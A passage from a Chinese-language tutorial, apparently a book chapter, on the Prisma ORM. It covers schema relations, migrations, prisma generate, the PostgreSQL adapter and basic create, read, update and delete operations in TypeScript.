  id        <span class="hljs-title class_">String</span>   <span class="hljs-meta">@id</span> <span class="hljs-meta">@default</span>(<span class="hljs-title function_">cuid</span>())
  title     <span class="hljs-title class_">String</span>
  content   <span class="hljs-title class_">String</span>
  userId    <span class="hljs-title class_">String</span>
  user      <span class="hljs-title class_">User</span>     <span class="hljs-meta">@relation</span>(<span class="hljs-attr">fields</span>: [userId], <span class="hljs-attr">references</span>: [id], <span class="hljs-attr">onDelete</span>: <span class="hljs-title class_">Cascade</span>, <span class="hljs-attr">onUpdate</span>: <span class="hljs-title class_">Cascade</span>)
  createdAt <span class="hljs-title class_">DateTime</span> <span class="hljs-meta">@default</span>(<span class="hljs-title function_">now</span>())
  updatedAt <span class="hljs-title class_">DateTime</span> <span class="hljs-meta">@updatedAt</span>
}
</code></pre>
<p>Prisma通过以下4步实现表关联：</p>
<p>（1）第一步是在文章表中引入外键字段。在Post模型里，userId String这个字段就是外键，它用于存放所属用户的id。从数据库角度看，这意味着Post表中每一行数据，都通过userId指向User表中的某一条记录，这是表关联最核心、也是最底层的实现方式。</p>
<p>（2）第二步是通过@relation明确外键指向规则。user User @relation(fields: [userId], references: [id]) 这一行告诉 Prisma：Post.userId对应的是User.id。fields 表示当前表中作为外键的字段，references 表示被引用表中的目标字段。这样一来，Prisma 在生成数据库结构时，会创建一条正式的外键约束，保证文章只能关联到真实存在的用户。</p>
<p>（3）第三步是在用户表中定义反向关系。User 模型中的posts Post[]并不会在数据库里额外生成字段，它只是一个“关系描述”。它的作用是告诉Prisma：一个用户可以关联多条文章记录。借助这一声明，Prisma Client才能在代码中提供诸如 prisma.user.findMany({ include: { posts: true } })这样的查询能力，实现从用户反查文章的能力。</p>
<p>（4）第四步是通过级联规则保证数据一致性。在@relation中配置的onDelete: Cascade和onUpdate: Cascade表示：当用户被删除或其主键被更新时，与之关联的文章会自动同步删除或更新。这一规则由数据库层执行，避免出现“文章存在，但作者已不存在”的脏数据问题，也让业务层不需要手动处理关联清理逻辑。</p>
<h2 data-id="heading-4">7.5 schema.prisma文件执行</h2>
<p>如果我们要将schema.prisma文件中，用JavaScript代码编写的内容转为SQL语句执行到数据库，要怎么做？需要我们运行迁移文件的一个命令。表7-1所示的prisma migrate dev，即根据schema变更创建迁移文件，应用到数据库，并重新生成Prisma Client。</p>
<p>--name：为本次迁移创建一个描述性名称（必填参数）。这个名称会成为我们迁移文件夹的一部分，用于清晰记录这次迁移的目的（例如这是我们第一次迁移，所以取名init）。</p>
<pre><code class="hljs language-ts" lang="ts">npx prisma migrate dev --name init
</code></pre>
<p>schema.prisma文件执行如图7-8所示。淡灰色内容从上往下的意思分别是：</p>
<p>（1）已从Prisma.config.ts文件中加载配置，也就是读取DATABASE_URL。</p>
<p>（2）从schema.prisma文件中加载Prisma模式，然后连接上PostgreSQL数据库。</p>
<p>然后进行应用迁移，迁移文件是20251214151823_init，其实是执行迁移命令的时间点加下划线和--name取的名字所组成的，所以能够看到我执行命令的时间是2025年12月14号。最后一行绿色英文说明的是我们的数据库和模式同步了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4fda9d00e4454ddbbb39ffcf3c62027e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWGlhb1l1MjAwMg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287409&amp;x-signature=5LYV4dfvdqsjsEZ6p%2FcOtWxVgyg%3D" alt="image-20251214231843933" loading="lazy"/></p>
<p align="center">
 <b> 图7-8 schema.prisma文件执行</b>
</p>
<p>文件迁移完成之后，会根据新的模式更改创建并应用，在prisma文件夹下创建migrations文件夹，这个文件夹就专门用来存放迁移文件的，里面有我们的20251214151823_init文件夹，而20251214151823_init文件夹里就有我们JavaScript代码所转化生成的SQL代码文件：migration.sql。让我们打开这个SQL迁移文件，看里面都有哪些内容？</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// migration.sql</span>
-- <span class="hljs-title class_">CreateTable</span>
<span class="hljs-variable constant_">CREATE</span> <span class="hljs-variable constant_">TABLE</span> <span class="hljs-string">"User"</span> (
    <span class="hljs-string">"id"</span> <span class="hljs-variable constant_">TEXT</span> <span class="hljs-variable constant_">NOT</span> <span class="hljs-variable constant_">NULL</span>,
    <span class="hljs-string">"email"</span> <span class="hljs-variable constant_">TEXT</span> <span class="hljs-variable constant_">NOT</span> <span class="hljs-variable constant_">NULL</span>,
    <span class="hljs-string">"password"</span> <span class="hljs-variable constant_">TEXT</span> <span class="hljs-variable constant_">NOT</span> <span class="hljs-variable constant_">NULL</span>,
    <span class="hljs-string">"createdAt"</span> <span class="hljs-title function_">TIMESTAMP</span>(<span class="hljs-number">3</span>) <span class="hljs-variable constant_">NOT</span> <span class="hljs-variable constant_">NULL</span> <span class="hljs-variable constant_">DEFAULT</span> <span class="hljs-variable constant_">CURRENT_TIMESTAMP</span>,
    <span class="hljs-string">"updatedAt"</span> <span class="hljs-title function_">TIMESTAMP</span>(<span class="hljs-number">3</span>) <span class="hljs-variable constant_">NOT</span> <span class="hljs-variable constant_">NULL</span>,

    <span class="hljs-variable constant_">CONSTRAINT</span> <span class="hljs-string">"User_pkey"</span> <span class="hljs-variable constant_">PRIMARY</span> <span class="hljs-variable constant_">KEY</span> (<span class="hljs-string">"id"</span>)
);

-- <span class="hljs-title class_">CreateTable</span>
<span class="hljs-variable constant_">CREATE</span> <span class="hljs-variable constant_">TABLE</span> <span class="hljs-string">"Post"</span> (
    <span class="hljs-string">"id"</span> <span class="hljs-variable constant_">TEXT</span> <span class="hljs-variable constant_">NOT</span> <span class="hljs-variable constant_">NULL</span>,
    <span class="hljs-string">"title"</span> <span class="hljs-variable constant_">TEXT</span> <span class="hljs-variable constant_">NOT</span> <span class="hljs-variable constant_">NULL</span>,
    <span class="hljs-string">"content"</span> <span class="hljs-variable constant_">TEXT</span> <span class="hljs-variable constant_">NOT</span> <span class="hljs-variable constant_">NULL</span>,
    <span class="hljs-string">"userId"</span> <span class="hljs-variable constant_">TEXT</span> <span class="hljs-variable constant_">NOT</span> <span class="hljs-variable constant_">NULL</span>,
    <span class="hljs-string">"createdAt"</span> <span class="hljs-title function_">TIMESTAMP</span>(<span class="hljs-number">3</span>) <span class="hljs-variable constant_">NOT</span> <span class="hljs-variable constant_">NULL</span> <span class="hljs-variable constant_">DEFAULT</span> <span class="hljs-variable constant_">CURRENT_TIMESTAMP</span>,
    <span class="hljs-string">"updatedAt"</span> <span class="hljs-title function_">TIMESTAMP</span>(<span class="hljs-number">3</span>) <span class="hljs-variable constant_">NOT</span> <span class="hljs-variable constant_">NULL</span>,

    <span class="hljs-variable constant_">CONSTRAINT</span> <span class="hljs-string">"Post_pkey"</span> <span class="hljs-variable constant_">PRIMARY</span> <span class="hljs-variable constant_">KEY</span> (<span class="hljs-string">"id"</span>)
);

-- <span class="hljs-title class_">CreateIndex</span>
<span class="hljs-variable constant_">CREATE</span> <span class="hljs-variable constant_">UNIQUE</span> <span class="hljs-variable constant_">INDEX</span> <span class="hljs-string">"User_email_key"</span> <span class="hljs-variable constant_">ON</span> <span class="hljs-string">"User"</span>(<span class="hljs-string">"email"</span>);

-- <span class="hljs-title class_">AddForeignKey</span>
<span class="hljs-variable constant_">ALTER</span> <span class="hljs-variable constant_">TABLE</span> <span class="hljs-string">"Post"</span> <span class="hljs-variable constant_">ADD</span> <span class="hljs-variable constant_">CONSTRAINT</span> <span class="hljs-string">"Post_userId_fkey"</span> <span class="hljs-variable constant_">FOREIGN</span> <span class="hljs-variable constant_">KEY</span> (<span class="hljs-string">"userId"</span>) <span class="hljs-variable constant_">REFERENCES</span> <span class="hljs-string">"User"</span>(<span class="hljs-string">"id"</span>) <span class="hljs-variable constant_">ON</span> <span class="hljs-variable constant_">DELETE</span> <span class="hljs-variable constant_">CASCADE</span> <span class="hljs-variable constant_">ON</span> <span class="hljs-variable constant_">UPDATE</span> <span class="hljs-variable constant_">CASCADE</span>;
</code></pre>
<p>migration.sql文件里面的SQL语句不需要我们再去执行一遍，JavaScript代码转化生成SQL语句的时候就已经执行过了，一般情况下，我们不需要关心migration.sql文件，它的作用更像是为我们每一次执行SQL语句存档备份。</p>
<p>接下来我们看下test数据库里的表结构，看User表和Post表是否成功添加到数据库中。schema.prisma文件成功执行修改数据库，如图7-9所示。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70b75b846b0e4a4b96dd9065813f4995~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWGlhb1l1MjAwMg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287409&amp;x-signature=%2BOEI%2FS0Asulfnuq34ijf4gC2aIk%3D" alt="image-20251214233425089" loading="lazy"/></p>
<p align="center">
 <b> 图7-9 schema.prisma文件成功执行修改数据库</b>
</p>
<p>在执行schema.prisma文件中的JavaScript代码并转化为SQL文件执行到数据库中之后。我们还需要执行以下一个Prisma命令，这个命令是每次执行schema.prisma文件之后都要运行一遍的。</p>
<pre><code class="hljs language-ts" lang="ts">npx prisma generate
</code></pre>
<p>这个命令是生成一个客户端文件的，生成的位置要从schema.prisma文件中查看，如下output所对应的路径就是客户端文件的生成位置。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/prisma/schema.prisma</span>
generator client {
  provider = <span class="hljs-string">"prisma-client"</span>
  output   = <span class="hljs-string">"../generated/prisma"</span>
}
</code></pre>
<p>终端执行prisma generate命令如图7-10所示。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f4406f4f49a4daa81819c28eb354751~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWGlhb1l1MjAwMg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287409&amp;x-signature=%2BQXNZOYdhfP3Q6qXIYDo%2FhWmn6Q%3D" alt="image.png" loading="lazy"/></p>
<p align="center">
 <b> 图7-10 终端执行prisma generate命令</b>
</p>
<p>prisma generate 命令会根据当前的 schema.prisma 生成一系列文件，如图 7-11 所示。由于 schema.prisma 发生变更后，Prisma Client 的结构也需要随之更新，因此每当修改 schema 文件时，都需要重新执行一次 prisma generate。</p>
<p>从本质上看，prisma generate 的作用是将 schema.prisma 中对数据模型、关系和约束的描述，转换为应用程序可以直接使用的 Prisma Client 代码。schema.prisma 本身只是一种用于描述数据库结构的声明式语言，无法被 Node.js 直接执行。</p>
<p>因此，Prisma 需要在生成阶段，将这些抽象的结构信息转化为包含运行时代码与 TypeScript 类型定义的 ORM 客户端实现。这样一来，开发者才能在 JavaScript / TypeScript 代码中，以类型安全的方式操作数据库，并持续获得准确的代码提示和参数校验。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d57a5610e39d4db9aef4f4d00611cb70~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWGlhb1l1MjAwMg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287409&amp;x-signature=ZyWo9r2f6OC%2Fet5UlPd7xeqzyxc%3D" alt="image-20251214235119681" loading="lazy"/></p>
<p align="center">
 <b> 图7-10 prisma generate命令生成文件</b>
</p>
<p>第一类被生成的文件是Prisma Client的核心代码。这些文件会被放在我们配置的output目录（如 ../generated/prisma）或默认的 node_modules/@prisma/client 中。它们定义了PrismaClient类以及prisma.user.findMany()、prisma.post.create() 等 API。生成的代码完全基于我们的 model 定义，因此我们只能访问schema中真实存在的表和字段，这也是Prisma能做到“写错字段名直接编译报错”的根本原因。</p>
<p>第二类文件是TypeScript类型定义（.d.ts）。这些类型文件描述了每个模型的字段类型、可用的查询参数、返回结果的结构以及关联关系的形态。它们让编辑器能够在我们写查询时提供自动补全、参数校验和返回值推导。换句话说，prisma generate把数据库结构“投射”成了TypeScript的类型系统，让数据库约束在代码层面就能被发现和约束。</p>
<p>第三类文件是 查询引擎与运行时绑定代码。Prisma在底层并不是直接用JS拼SQL，而是通过一个高性能的查询引擎（基于Rust）来执行查询。生成的文件中包含了JS与查询引擎之间的桥接逻辑、序列化规则以及错误映射机制。这一步的存在，是Prisma在复杂查询、事务和性能表现上稳定可靠的关键原因。</p>
<p>之所以必须“生成”这些文件，而不是在运行时动态解析schema，是因为这种方式可以在启动前完成所有结构分析与校验。一旦生成完成，运行时只需要调用已经确定结构和类型的代码，既减少了性能开销，也避免了在生产环境中因schema错误而产生不可预期的问题。这也是 Prisma 非常适合Serverless和Edge场景的原因之一。</p>
<p>接下来，我们来梳理一下思路：</p>
<p>通过prisma migrate dev命令，我们同时做了3件事情：</p>
<p>（1）对比 schema.prisma 和当前数据库。</p>
<p>（2）生成一份迁移 SQL 文件。</p>
<p>（3）把这份 SQL 真正执行到数据库。</p>
<p>到这一步为止，SQL 都已经执行到数据库里了，如果从“数据库存在与否”的角度看，确实已经结束了。那为什么还要 prisma generate？它到底在补什么？</p>
<p>migrate解决的是数据库长什么样，而generate解决的是我们在代码里怎么用它。如果我们现在“不 generate”，会发生什么？假设一个情况：现在只有数据库（表已经存在了）和migration SQL，没有Prisma Client。</p>
<p>然后我们在代码文件里写以下这行代码。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> prisma.<span class="hljs-property">user</span>.<span class="hljs-title function_">findMany</span>()
</code></pre>
<p>就会出现问题了，prisma.user是谁？.findMany() 是谁定义的？返回值是什么结构？答案是：没人知道。因为数据库不会“反向生成 JS API”，SQL不会自动变成TypeScript类型，而Node.js更不会认识我们的schema。</p>
<p>到这里，我们可以更深刻的意识到，我们使用的Prisma是一个ORM框架，通过JavaScript代码转化成SQL语句执行后，我们也需要数据库中的表、字段等信息提供给我们一定量的代码提示，方便我们以JavaScript的形式继续写下去并且持续获得良好的提示反馈。例如我们要新增一个字段，但其实表中已经有这个字段了，要删除一个字段，而表中其实没有这个字段，如果没有类型约束，这类错误往往要等到运行时甚至线上才暴露。很多操作都需要有良好的代码提示，否则我们很难持续的用JavaScript代码去操作数据库。</p>
<h2 data-id="heading-5">7.6 Prisma增删改查</h2>
<h3 data-id="heading-6">7.6.1 PrismaClient的引入</h3>
<p>完成了一次Prisma的基础建设：项目初始化、连接数据库、执行schema.prisma文件操作数据库以及通过prisma generate生成对应的数据库客户端代码。接下来我们会通过Prisma做一次基础的增删改查，前置要求为以下2点：</p>
<p>（1）在PRISMA项目下创建index.ts文件，用于写入增删改查代码。</p>
<p>（2）在package.json文件中添加"type"字段，设置为module，开启ESM语法。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// Prisma旧版本写法</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">PrismaClient</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@prisma/client"</span>
<span class="hljs-comment">// Prisma7新版本写法</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">PrismaClient</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"./generated/prisma/client.ts"</span>;
</code></pre>
<p>编写增删改查的代码，我们需要引入PrismaClient，因为PrismaClient是数据库操作的统一入口。在Prisma旧版本中，是存放在@prisma/client中，而在目前Prisma7版本中，是存放在./generated/prisma/client下，也就是通过prisma generate命令生成的数据库客户端代码中。</p>
<p>但Prisma新版本为什么把 PrismaClient从@prisma/client“挪出来”？</p>
<p>在旧版本 Prisma 中，PrismaClient 是通过 @prisma/client 这个包直接引入的。虽然这种方式使用起来非常方便，但它在工程语义上存在一个隐含问题：Prisma Client 实际上是根据当前项目的 schema.prisma 动态生成的代码，却被放置在 node_modules 这样一个本应只存放第三方依赖的目录中。这会模糊“外部依赖”和“项目生成代码”之间的边界，使生成物的来源和职责不够清晰。</p>
<p>随着项目规模变大，这种设计的局限逐渐显现。例如在多数据库、多 schema 或 Monorepo 的场景下，项目往往需要同时维护多个 Prisma Client。旧的引入方式只能依赖包名区分，不仅结构笨拙，也不利于表达不同 Client 在项目中的实际角色。此外，在 Serverless、Edge Runtime 或使用现代构建工具时，node_modules 可能被裁剪或重组，导致生成的 Prisma Client 不易被稳定、明确地管理。</p>
<p>因此，在新版本中，Prisma 将生成的 Client 明确输出到项目内的指定目录，并通过相对路径进行引入。这一变化本质上是将 Prisma Client 从“隐藏在依赖中的黑盒”转变为“项目中的显式生成产物”。生成代码的位置、来源和用途都变得一目了然，也更符合“生成代码属于项目本身”的直觉。</p>
<p>这种调整带来的直接好处是工程结构更加清晰。每一个 Prisma Client 都有明确的输出路径和语义位置，天然支持多 Client 并存，也更适合在 Monorepo 或分层架构中进行统一管理。同时，构建工具和部署环境也能更准确地识别和打包这些生成文件，减少因环境差异带来的不确定性。</p>
<p>因此Prisma 新版本中 PrismaClient 引入方式的变化是工程理念上的升级：通过显式化生成代码的位置，明确区分第三方依赖与项目生成物，从而让 Prisma 在复杂工程和现代运行环境中更加可控、可靠。</p>
<h3 data-id="heading-7">7.6.2 适配器</h3>
<p>完成PrismaClient的引入后，由于我们使用的是PostgreSQL数据库，所以还需要引入对应的适配器。Prisma针对不同数据库存在不同的“适配层”，例如MySQL的适配器和PostgreSQL的适配器不是同一个，而这是ORM能够成立的一个必要前提，不是可有可无的设计。</p>
<p>首先，Prisma 并不是直接执行一套“通用 SQL”。虽然我们在代码里写的是统一的 Prisma Client API，但底层真正执行的，是针对具体数据库生成并优化过的查询逻辑。PostgreSQL、MySQL、SQLite、SQL Server 在 SQL 方言、数据类型、约束行为以及事务语义上都有大量差异，如果没有适配层，ORM 就只能支持“最小公分母”（即SQL语言中保持一致的部分），功能和性能都会被严重限制。</p>
<p>其次，适配器的存在是为了屏蔽数据库差异，向上提供统一模型。Prisma 的目标，是让我们在 JavaScript / TypeScript 层面始终面对一致的模型定义和查询方式。为了实现这一点，Prisma 必须在底层为每一种数据库实现一套映射规则：如何把 String 映射成具体数据库的列类型，如何实现 @default(now())，如何生成外键约束，如何处理 onDelete: Cascade 等行为。这些逻辑无法通过一套通用规则完成，只能针对不同数据库分别实现。</p>
<p>再次，不同数据库在“能力边界”上的差异，决定了适配器必须不同。例如，PostgreSQL 支持原生的 JSONB、数组类型、复杂索引和更强的事务隔离能力，而 SQLite 在并发和约束能力上相对有限，MySQL 在时间精度、大小写敏感性等方面也有自身特性。Prisma 的适配器不仅要“能跑”，还要确保行为符合该数据库的真实语义，否则就会出现“代码看起来没问题，但数据库行为完全不一致”的风险。</p>
<p>所以Prisma为不同数据库提供不同适配器，并不是为了增加复杂度，而是为了在“统一抽象”和“数据库之间存在差异”之间取得平衡。适配器的作用，是把各数据库千差万别的实现细节收敛到底层，让上层的 Prisma Client 保持稳定、可预测、类型安全，从而确保ORM能够在复杂工程中长期使用。</p>
<p>PostgreSQL适配器文档如图7-11所示，Prisma给每一个数据库都编写了对应的适配器使用文档。文档地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.prisma.io%2Fdocs%2Form%2Foverview%2Fdatabases%2Fpostgresql" target="_blank" title="https://www.prisma.io/docs/orm/overview/databases/postgresql" ref="nofollow noopener noreferrer">PostgreSQL database connector | Prisma Documentation</a>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0bd4937cfb44212a237c6c37c2dd675~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWGlhb1l1MjAwMg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287409&amp;x-signature=eGCW7dxRg557Nqiu6eQlqXas6H4%3D" alt="image-20251217003849720" loading="lazy"/></p>
<p align="center">
 <b> 图7-11 PostgreSQL适配器文档</b>
</p>
<p>接下来通过npm命令来安装适配器。</p>
<pre><code class="hljs language-ts" lang="ts">npm install <span class="hljs-meta">@prisma</span>/adapter-pg
</code></pre>
<p>安装完成之后，通过以下命令引入并且使用。使用process读取环境变量会报错，错误如下：</p>
<p>找不到名称“process”。是否需要安装 Node.js 的类型定义? 请尝试运行 npm i --save-dev @types/node。把这行npm命令在终端执行就可以消除报错了。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/index.ts</span>
<span class="hljs-comment">// 引入环境变量</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'dotenv/config'</span>
<span class="hljs-comment">// 引入适配器</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">PrismaPg</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@prisma/adapter-pg'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">PrismaClient</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./generated/prisma/clien.ts'</span>
<span class="hljs-comment">// 连接的数据库地址，通过环境变量读取</span>
<span class="hljs-keyword">const</span> connectionString = <span class="hljs-string">`<span class="hljs-subst">${process.env.DATABASE_URL}</span>`</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(connectionString)
</code></pre>
<p>我们直接使用node执行index.ts文件（引入的PrismaClient所对应的路径来源client需要加后缀.ts），看环境变量能否正常读取。实际是可以的，读取内容不再展示。</p>
<p>确认可以读取到环境变量后，通过以下两行代码对prisma进行初始化，主要做的事情是先创建一个“如何与 PostgreSQL 对话”的适配器，再把这个适配器交给 PrismaClient，让 Prisma 知道“底层该用哪种方式连数据库并执行 SQL”。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> adapter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrismaPg</span>({ connectionString })
<span class="hljs-keyword">const</span> prisma = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrismaClient</span>({ adapter })
</code></pre>
<p>先连接一下数据库，看能否正常连接。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/index.ts</span>
<span class="hljs-comment">// 引入环境变量</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'dotenv/config'</span>
<span class="hljs-comment">// 引入适配器</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">PrismaPg</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@prisma/adapter-pg'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">PrismaClient</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./generated/prisma/client.ts'</span>
<span class="hljs-comment">// 连接的数据库地址，通过环境变量读取</span>
<span class="hljs-keyword">const</span> connectionString = <span class="hljs-string">`<span class="hljs-subst">${process.env.DATABASE_URL}</span>`</span>

<span class="hljs-keyword">const</span> adapter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrismaPg</span>({ connectionString })
<span class="hljs-keyword">const</span> prisma = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrismaClient</span>({ adapter })

<span class="hljs-keyword">const</span> <span class="hljs-title function_">main</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">await</span> prisma.$connect()
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'连接数据库成功'</span>)
}

<span class="hljs-title function_">main</span>()
<span class="hljs-comment">// 连接数据库成功</span>
</code></pre>
<p>接下来，我们就可以基于prisma实例对象去进行增删改查的操作。</p>
<h3 data-id="heading-8">7.6.3 增删改查操作</h3>
<p>增删改查通过prisma实例对象里的一些方法去实现。并且由于通过prisma generate命令生成的数据库客户端代码有对应的声明文件，因此在编写代码操作时，是由对应的代码提示的，例如想操作数据库在哪张表（post表/user表），如图7-12所示。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/409640fe0d9f4a6bbf6a32e329d2fa14~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWGlhb1l1MjAwMg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287409&amp;x-signature=8kDrqZQEutT5S1Qgw7dciJgwTV4%3D" alt="image-20251217010858972" loading="lazy"/></p>
<p align="center">
 <b> 图7-12 声明文件的作用</b>
</p>
<p>新增操作对应的是 create() 和 createMany() 方法，当我们调用 prisma.user.create() 时，Prisma 会根据 schema 中的字段定义，强制我们提供所有必填字段，并自动处理默认值（如 cuid()、now()）。而对于需要批量插入数据的场景，则可以使用 createMany()方法，它会在保持结构校验的同时，减少数据库往返次数，提高效率。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/index.ts</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">main</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">await</span> prisma.$connect()
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'连接数据库成功'</span>)
  <span class="hljs-keyword">const</span> user =<span class="hljs-keyword">await</span> prisma.<span class="hljs-property">user</span>.<span class="hljs-title function_">create</span>({
    <span class="hljs-attr">data</span>:{
      <span class="hljs-attr">email</span>:<span class="hljs-string">'test@test.com'</span>,
      <span class="hljs-attr">password</span>:<span class="hljs-string">'123456'</span>
    }
  })
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user)
}
</code></pre>
<p>通过prisma实例对象的create创建方法成功创建数据之后，是有返回值的，通过打印返回值可见id、email、password，createAt和updateAt这些字段，如图7-13所示。这些返回信息可以有效提示数据是否创建成功，从数据库中可查看到user表的对应新增数据。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/376b7f98160846089394e8a400ac08eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgWGlhb1l1MjAwMg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287409&amp;x-signature=4EQsqsGMmaCCqBokPUrsX0RzRwQ%3D" alt="image-20251217011406081" loading="lazy"/></p>
<p align="center">
 <b> 图7-13 创建数据的返回信息</b>
</p>
<p>除此之外，还可以同时创建子表的对应数据，都非常方便，不需要我们去编写SQL语句，而是用面向对象的方式就完成需求。</p>
<p><strong>查询</strong>：对应 Prisma 中的 findMany()、findUnique()、findFirst()等方法。例如，通过 prisma.user.findMany()，可以一次性获取用户表中的多条记录；而 findUnique()方法则要求查询条件必须命中唯一约束（如 id 或 email字段）。Prisma 会根据 schema 中定义的唯一性规则，在代码层面就限制我们只能写合法的查询条件，避免在运行时才发现查询逻辑错误。</p>
<p>此外，查询操作还可以通过 where、select、include 等参数进行精确控制，在 JavaScript 层就能清晰表达“我要什么数据”，而不需要关心 SQL 的拼接细节。</p>
<p><strong>修改</strong>：主要通过update()和updateMany()实现。update()方法要求提供一个唯一条件（例如 id），以确保“我们要改的是哪一条数据”；updateMany()方法则适用于批量更新，但不会返回具体修改后的记录。</p>
<p>Prisma 在更新操作中非常强调明确性：必须清楚地告诉它“更新哪条数据”和“更新哪些字段”，而不能像手写 SQL 那样随意省略条件。这种设计可以有效避免误操作，比如一次不小心更新整张表。同时，Prisma 会自动维护诸如@updatedAt这样的字段，让更新时间的逻辑从业务代码中彻底消失。</p>
<p><strong>删除</strong>：对应delete()和deleteMany()方法。delete()方法同样需要唯一条件，确保你删除的是一条明确的数据；deleteMany()方法则允许批量删除。这里 Prisma 的优势在于：删除行为会受到 schema 中关系定义的约束。例如我们在 Post 和 User 的关系中配置了 onDelete: Cascade，那么当我们删除用户时，Prisma 会配合数据库自动删除关联的文章，保证数据不会“断链”。这些规则不是写在业务代码里的，而是写在 schema 中，由 Prisma 和数据库共同维护。</p>
<p>对应的代码逻辑如下。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/index.ts</span>
<span class="hljs-comment">// 查询所有用户</span>
<span class="hljs-keyword">const</span> users = <span class="hljs-keyword">await</span> prisma.<span class="hljs-property">user</span>.<span class="hljs-title function_">findMany</span>()
<span class="hljs-comment">// users 是 User[]</span>

<span class="hljs-comment">// 按唯一字段查询单个用户（如 email）</span>
<span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> prisma.<span class="hljs-property">user</span>.<span class="hljs-title function_">findUnique</span>({
  <span class="hljs-attr">where</span>: {
    <span class="hljs-attr">email</span>: <span class="hljs-string">'test@test.com'</span>
  }
})
<span class="hljs-comment">// user 是 User | null</span>

<span class="hljs-comment">// 根据唯一字段（id 或 email）修改用户信息</span>
<span class="hljs-keyword">const</span> updatedUser = <span class="hljs-keyword">await</span> prisma.<span class="hljs-property">user</span>.<span class="hljs-title function_">update</span>({
  <span class="hljs-attr">where</span>: {
    <span class="hljs-attr">email</span>: <span class="hljs-string">'test@test.com'</span>
  },
  <span class="hljs-attr">data</span>: {
    <span class="hljs-attr">password</span>: <span class="hljs-string">'new-password'</span>
  }
})
<span class="hljs-comment">// 返回修改后的用户对象</span>

<span class="hljs-comment">// 根据唯一字段删除用户</span>
<span class="hljs-keyword">const</span> deletedUser = <span class="hljs-keyword">await</span> prisma.<span class="hljs-property">user</span>.<span class="hljs-title function_">delete</span>({
  <span class="hljs-attr">where</span>: {
    <span class="hljs-attr">email</span>: <span class="hljs-string">'test@test.com'</span>
  }
})
<span class="hljs-comment">// 返回被删除的用户对象</span>
</code></pre>
<p>总体来说，增删改查除了最基础的用法，还有很多丰富的进阶的方法或者扩展的方式（例如通过where限制条件），唯一的区别是操作的细度不同。正常的增删改查是不需要通过prisma generate命令去重新生成数据库客户端代码的，是否执行prisma generate命令基本上取决于我们是否修改并更新schema.prisma文件。</p>
<h3 data-id="heading-9">7.6.4 查询参数</h3>
